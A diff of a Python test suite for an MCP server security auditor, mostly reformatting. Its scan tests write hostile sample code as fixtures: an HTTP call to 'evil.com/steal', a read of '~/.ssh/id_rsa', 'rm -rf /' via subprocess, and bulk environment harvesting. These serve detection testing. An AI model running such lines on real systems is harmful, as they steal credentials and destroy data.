@@ -8,13 +8,8 @@ Issue #468
 """
 
 import json
-import os
-import tempfile
-from pathlib import Path
-from unittest import mock
 from unittest.mock import MagicMock, patch
 
-import pytest
 
 from ai_guardian.mcp_audit import (
     MCPAuditor,
@@ -60,18 +55,24 @@ class TestDiscoverServers:
     def test_discover_from_claude_json(self, tmp_path):
         """Discover MCP servers from ~/.claude.json."""
         config_file = tmp_path / ".claude.json"
-        config_file.write_text(json.dumps({
-            "mcpServers": {
-                "my-server": {
-                    "command": "uvx",
-                    "args": ["my-server-package"],
-                    "env": {"API_KEY": "secret-value"}
+        config_file.write_text(
+            json.dumps(
+                {
+                    "mcpServers": {
+                        "my-server": {
+                            "command": "uvx",
+                            "args": ["my-server-package"],
+                            "env": {"API_KEY": "secret-value"},
+                        }
+                    }
                 }
-            }
-        }))
+            )
+        )
 
         auditor = MCPAuditor()
-        with patch.object(auditor, "_get_config_paths", return_value=[str(config_file)]):
+        with patch.object(
+            auditor, "_get_config_paths", return_value=[str(config_file)]
+        ):
             with patch.object(auditor, "_check_trust", return_value=False):
                 servers = auditor.discover_servers()
 
@@ -87,7 +88,9 @@ class TestDiscoverServers:
         config_file.write_text(json.dumps({"someOtherKey": {}}))
 
         auditor = MCPAuditor()
-        with patch.object(auditor, "_get_config_paths", return_value=[str(config_file)]):
+        with patch.object(
+            auditor, "_get_config_paths", return_value=[str(config_file)]
+        ):
             servers = auditor.discover_servers()
 
         assert len(servers) == 0
@@ -95,7 +98,9 @@ class TestDiscoverServers:
     def test_discover_no_config_files(self):
         """No servers found when config files don't exist."""
         auditor = MCPAuditor()
-        with patch.object(auditor, "_get_config_paths", return_value=["/nonexistent/file.json"]):
+        with patch.object(
+            auditor, "_get_config_paths", return_value=["/nonexistent/file.json"]
+        ):
             servers = auditor.discover_servers()
 
         assert len(servers) == 0
@@ -107,17 +112,16 @@ class TestDiscoverServers:
 
         server_def = {
             "mcpServers": {
-                "shared-server": {
-                    "command": "npx",
-                    "args": ["shared-package"]
-                }
+                "shared-server": {"command": "npx", "args": ["shared-package"]}
             }
         }
         config1.write_text(json.dumps(server_def))
         config2.write_text(json.dumps(server_def))
 
         auditor = MCPAuditor()
-        with patch.object(auditor, "_get_config_paths", return_value=[str(config1), str(config2)]):
+        with patch.object(
+            auditor, "_get_config_paths", return_value=[str(config1), str(config2)]
+        ):
             with patch.object(auditor, "_check_trust", return_value=True):
                 servers = auditor.discover_servers()
 
@@ -130,21 +134,27 @@ class TestDiscoverServers:
     def test_discover_env_var_names_only(self, tmp_path):
         """Env var values are NOT stored, only names."""
         config_file = tmp_path / "settings.json"
-        config_file.write_text(json.dumps({
-            "mcpServers": {
-                "secret-server": {
-                    "command": "node",
-                    "args": ["server.js"],
-                    "env": {
-                        "API_TOKEN": "super-secret-token-value",
-                        "DB_PASSWORD": "another-secret"
+        config_file.write_text(
+            json.dumps(
+                {
+                    "mcpServers": {
+                        "secret-server": {
+                            "command": "node",
+                            "args": ["server.js"],
+                            "env": {
+                                "API_TOKEN": "super-secret-token-value",
+                                "DB_PASSWORD": "another-secret",
+                            },
+                        }
                     }
                 }
-            }
-        }))
+            )
+        )
 
         auditor = MCPAuditor()
-        with patch.object(auditor, "_get_config_paths", return_value=[str(config_file)]):
+        with patch.object(
+            auditor, "_get_config_paths", return_value=[str(config_file)]
+        ):
             with patch.object(auditor, "_check_trust", return_value=False):
                 servers = auditor.discover_servers()
 
@@ -158,16 +168,22 @@ class TestDiscoverServers:
     def test_discover_multiple_servers(self, tmp_path):
         """Discover multiple servers from one config file."""
         config_file = tmp_path / "settings.json"
-        config_file.write_text(json.dumps({
-            "mcpServers": {
-                "server-a": {"command": "uvx", "args": ["pkg-a"]},
-                "server-b": {"command": "npx", "args": ["-y", "pkg-b"]},
-                "server-c": {"command": "python", "args": ["-m", "server_c"]},
-            }
-        }))
+        config_file.write_text(
+            json.dumps(
+                {
+                    "mcpServers": {
+                        "server-a": {"command": "uvx", "args": ["pkg-a"]},
+                        "server-b": {"command": "npx", "args": ["-y", "pkg-b"]},
+                        "server-c": {"command": "python", "args": ["-m", "server_c"]},
+                    }
+                }
+            )
+        )
 
         auditor = MCPAuditor()
-        with patch.object(auditor, "_get_config_paths", return_value=[str(config_file)]):
+        with patch.object(
+            auditor, "_get_config_paths", return_value=[str(config_file)]
+        ):
             with patch.object(auditor, "_check_trust", return_value=False):
                 servers = auditor.discover_servers()
 
@@ -181,7 +197,9 @@ class TestDiscoverServers:
         config_file.write_text("{invalid json")
 
         auditor = MCPAuditor()
-        with patch.object(auditor, "_get_config_paths", return_value=[str(config_file)]):
+        with patch.object(
+            auditor, "_get_config_paths", return_value=[str(config_file)]
+        ):
             servers = auditor.discover_servers()
 
         assert len(servers) == 0
@@ -197,53 +215,67 @@ class TestAuditConfig:
 
     def test_credential_exposure_untrusted(self):
         """Untrusted server with credential env var triggers critical finding."""
-        servers = [_make_server(
-            name="risky-server",
-            env_var_names=["API_TOKEN", "NORMAL_VAR"],
-            is_trusted=False,
-        )]
+        servers = [
+            _make_server(
+                name="risky-server",
+                env_var_names=["API_TOKEN", "NORMAL_VAR"],
+                is_trusted=False,
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
-        cred_findings = [f for f in report.findings if f.category == "credential_exposure"]
+        cred_findings = [
+            f for f in report.findings if f.category == "credential_exposure"
+        ]
         assert len(cred_findings) == 1
         assert cred_findings[0].severity == "critical"
         assert "API_TOKEN" in cred_findings[0].message
 
     def test_credential_exposure_trusted(self):
         """Trusted server with credential env var is OK."""
-        servers = [_make_server(
-            name="trusted-server",
-            env_var_names=["API_TOKEN", "SECRET_KEY"],
-            is_trusted=True,
-        )]
+        servers = [
+            _make_server(
+                name="trusted-server",
+                env_var_names=["API_TOKEN", "SECRET_KEY"],
+                is_trusted=True,
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
-        cred_findings = [f for f in report.findings if f.category == "credential_exposure"]
+        cred_findings = [
+            f for f in report.findings if f.category == "credential_exposure"
+        ]
         assert len(cred_findings) == 0
 
     def test_credential_multiple_vars(self):
         """Multiple credential env vars on untrusted server produce multiple findings."""
-        servers = [_make_server(
-            name="multi-cred",
-            env_var_names=["API_KEY", "AUTH_TOKEN", "DB_PASSWORD"],
-            is_trusted=False,
-        )]
+        servers = [
+            _make_server(
+                name="multi-cred",
+                env_var_names=["API_KEY", "AUTH_TOKEN", "DB_PASSWORD"],
+                is_trusted=False,
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
-        cred_findings = [f for f in report.findings if f.category == "credential_exposure"]
+        cred_findings = [
+            f for f in report.findings if f.category == "credential_exposure"
+        ]
         assert len(cred_findings) == 3
 
     def test_npx_auto_install_untrusted(self):
         """Untrusted npx -y server triggers medium finding."""
-        servers = [_make_server(
-            name="npx-server",
-            command="npx",
-            args=["-y", "some-package"],
-            is_trusted=False,
-        )]
+        servers = [
+            _make_server(
+                name="npx-server",
+                command="npx",
+                args=["-y", "some-package"],
+                is_trusted=False,
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
@@ -253,12 +285,14 @@ class TestAuditConfig:
 
     def test_npx_auto_install_trusted(self):
         """Trusted npx -y server does not trigger npx_auto_install finding."""
-        servers = [_make_server(
-            name="trusted-npx",
-            command="npx",
-            args=["-y", "trusted-package"],
-            is_trusted=True,
-        )]
+        servers = [
+            _make_server(
+                name="trusted-npx",
+                command="npx",
+                args=["-y", "trusted-package"],
+                is_trusted=True,
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
@@ -267,11 +301,13 @@ class TestAuditConfig:
 
     def test_unpinned_version_npx(self):
         """npx package without @version pin triggers medium finding."""
-        servers = [_make_server(
-            name="unpinned",
-            command="npx",
-            args=["some-package"],
-        )]
+        servers = [
+            _make_server(
+                name="unpinned",
+                command="npx",
+                args=["some-package"],
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
@@ -281,11 +317,13 @@ class TestAuditConfig:
 
     def test_pinned_version_ok(self):
         """npx package with @version is not flagged for unpinned_version."""
-        servers = [_make_server(
-            name="pinned",
-            command="npx",
-            args=["some-package@1.2.3"],
-        )]
+        servers = [
+            _make_server(
+                name="pinned",
+                command="npx",
+                args=["some-package@1.2.3"],
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
@@ -294,11 +332,13 @@ class TestAuditConfig:
 
     def test_unpinned_version_uvx(self):
         """uvx package without @version pin triggers medium finding."""
-        servers = [_make_server(
-            name="uvx-unpinned",
-            command="uvx",
-            args=["my-mcp-server"],
-        )]
+        servers = [
+            _make_server(
+                name="uvx-unpinned",
+                command="uvx",
+                args=["my-mcp-server"],
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
@@ -307,10 +347,12 @@ class TestAuditConfig:
 
     def test_suspicious_url_raw_ip(self):
         """Raw IP in args triggers high finding."""
-        servers = [_make_server(
-            name="ip-server",
-            args=["--url", "http://192.168.1.100:3000"],
-        )]
+        servers = [
+            _make_server(
+                name="ip-server",
+                args=["--url", "http://192.168.1.100:3000"],
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
@@ -320,10 +362,12 @@ class TestAuditConfig:
 
     def test_suspicious_url_ngrok(self):
         """ngrok URL in args triggers high finding."""
-        servers = [_make_server(
-            name="ngrok-server",
-            args=["--endpoint", "https://abc123.ngrok.io"],
-        )]
+        servers = [
+            _make_server(
+                name="ngrok-server",
+                args=["--endpoint", "https://abc123.ngrok.io"],
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
@@ -332,10 +376,12 @@ class TestAuditConfig:
 
     def test_suspicious_url_localhost(self):
         """localhost URL in args triggers high finding."""
-        servers = [_make_server(
-            name="local-server",
-            args=["--host", "http://localhost:8080"],
-        )]
+        servers = [
+            _make_server(
+                name="local-server",
+                args=["--host", "http://localhost:8080"],
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
@@ -344,13 +390,15 @@ class TestAuditConfig:
 
     def test_clean_server_no_findings(self):
         """Server with no issues produces no findings."""
-        servers = [_make_server(
-            name="clean-server",
-            command="uvx",
-            args=["clean-package@1.0.0"],
-            env_var_names=["NORMAL_SETTING"],
-            is_trusted=True,
-        )]
+        servers = [
+            _make_server(
+                name="clean-server",
+                command="uvx",
+                args=["clean-package@1.0.0"],
+                env_var_names=["NORMAL_SETTING"],
+                is_trusted=True,
+            )
+        ]
         auditor = MCPAuditor()
         report = auditor.audit_config(servers)
 
@@ -376,11 +424,15 @@ class TestScanSource:
         """Detect outbound HTTP calls in source code."""
         source_dir = tmp_path / "server_src"
         source_dir.mkdir()
-        (source_dir / "main.py").write_text("import requests\ndata = requests.get('http://evil.com/steal')\n")
+        (source_dir / "main.py").write_text(
+            "import requests\ndata = requests.get('http://evil.com/steal')\n"
+        )
 
         server = _make_server(name="http-server")
         auditor = MCPAuditor()
-        with patch.object(auditor, "_resolve_source_path", return_value=str(source_dir)):
+        with patch.object(
+            auditor, "_resolve_source_path", return_value=str(source_dir)
+        ):
             report = auditor.scan_source(server)
 
         assert report is not None
@@ -391,15 +443,21 @@ class TestScanSource:
         """Detect reads of sensitive file paths."""
         source_dir = tmp_path / "server_src"
         source_dir.mkdir()
-        (source_dir / "loader.py").write_text("with open('~/.ssh/id_rsa') as f:\n    key = f.read()\n")
+        (source_dir / "loader.py").write_text(
+            "with open('~/.ssh/id_rsa') as f:\n    key = f.read()\n"
+        )
 
         server = _make_server(name="ssh-reader")
         auditor = MCPAuditor()
-        with patch.object(auditor, "_resolve_source_path", return_value=str(source_dir)):
+        with patch.object(
+            auditor, "_resolve_source_path", return_value=str(source_dir)
+        ):
             report = auditor.scan_source(server)
 
         assert report is not None
-        file_findings = [f for f in report.findings if f.category == "sensitive_file_read"]
+        file_findings = [
+            f for f in report.findings if f.category == "sensitive_file_read"
+        ]
         assert len(file_findings) >= 1
         assert file_findings[0].severity == "high"
 
@@ -407,11 +465,15 @@ class TestScanSource:
         """Detect subprocess and exec calls."""
         source_dir = tmp_path / "server_src"
         source_dir.mkdir()
-        (source_dir / "runner.py").write_text("import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n")
+        (source_dir / "runner.py").write_text(
+            "import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"
+        )
 
         server = _make_server(name="exec-server")
         auditor = MCPAuditor()
-        with patch.object(auditor, "_resolve_source_path", return_value=str(source_dir)):
+        with patch.object(
+            auditor, "_resolve_source_path", return_value=str(source_dir)
+        ):
             report = auditor.scan_source(server)
 
         assert report is not None
@@ -423,11 +485,15 @@ class TestScanSource:
         """Detect base64 encoding patterns."""
         source_dir = tmp_path / "server_src"
         source_dir.mkdir()
-        (source_dir / "exfil.py").write_text("import base64\nencoded = base64.b64encode(sensitive_data)\n")
+        (source_dir / "exfil.py").write_text(
+            "import base64\nencoded = base64.b64encode(sensitive_data)\n"
+        )
 
         server = _make_server(name="b64-server")
         auditor = MCPAuditor()
-        with patch.object(auditor, "_resolve_source_path", return_value=str(source_dir)):
+        with patch.object(
+            auditor, "_resolve_source_path", return_value=str(source_dir)
+        ):
             report = auditor.scan_source(server)
 
         assert report is not None
@@ -438,11 +504,15 @@ class TestScanSource:
         """Detect bulk environment variable access."""
         source_dir = tmp_path / "server_src"
         source_dir.mkdir()
-        (source_dir / "harvest.py").write_text("import os\nall_env = dict(os.environ)\n")
+        (source_dir / "harvest.py").write_text(
+            "import os\nall_env = dict(os.environ)\n"
+        )
 
         server = _make_server(name="env-harvester")
         auditor = MCPAuditor()
-        with patch.object(auditor, "_resolve_source_path", return_value=str(source_dir)):
+        with patch.object(
+            auditor, "_resolve_source_path", return_value=str(source_dir)
+        ):
             report = auditor.scan_source(server)
 
         assert report is not None
@@ -467,7 +537,9 @@ class TestScanSource:
 
         server = _make_server(name="clean-server")
         auditor = MCPAuditor()
-        with patch.object(auditor, "_resolve_source_path", return_value=str(source_dir)):
+        with patch.object(
+            auditor, "_resolve_source_path", return_value=str(source_dir)
+        ):
             report = auditor.scan_source(server)
 
         assert report is not None
@@ -485,7 +557,9 @@ class TestScanSource:
 
         server = _make_server(name="skip-nm")
         auditor = MCPAuditor()
-        with patch.object(auditor, "_resolve_source_path", return_value=str(source_dir)):
+        with patch.object(
+            auditor, "_resolve_source_path", return_value=str(source_dir)
+        ):
             report = auditor.scan_source(server)
 
         assert report is not None
@@ -501,7 +575,9 @@ class TestScanSource:
 
         server = _make_server(name="timing")
         auditor = MCPAuditor()
-        with patch.object(auditor, "_resolve_source_path", return_value=str(source_dir)):
+        with patch.object(
+            auditor, "_resolve_source_path", return_value=str(source_dir)
+        ):
             report = auditor.scan_source(server)
 
         assert report.files_scanned == 2
@@ -539,7 +615,9 @@ class TestTrustChecking:
     def test_trust_check_handles_errors(self):
         """Trust check returns False on errors."""
         auditor = MCPAuditor()
-        with patch("ai_guardian.tool_policy.ToolPolicyChecker", side_effect=Exception("boom")):
+        with patch(
+            "ai_guardian.tool_policy.ToolPolicyChecker", side_effect=Exception("boom")
+        ):
             assert auditor._check_trust("error-server") is False
 
 
@@ -555,7 +633,9 @@ class TestOutputFormatting:
         """JSON output has correct structure with config_sources list."""
         servers = [
             _make_server(name="s1", is_trusted=True, config_sources=["~/.claude.json"]),
-            _make_server(name="s2", is_trusted=False, config_sources=["~/.cursor/mcp.json"]),
+            _make_server(
+                name="s2", is_trusted=False, config_sources=["~/.cursor/mcp.json"]
+            ),
         ]
         auditor = MCPAuditor()
         result = json.loads(auditor.get_server_list_json(servers))
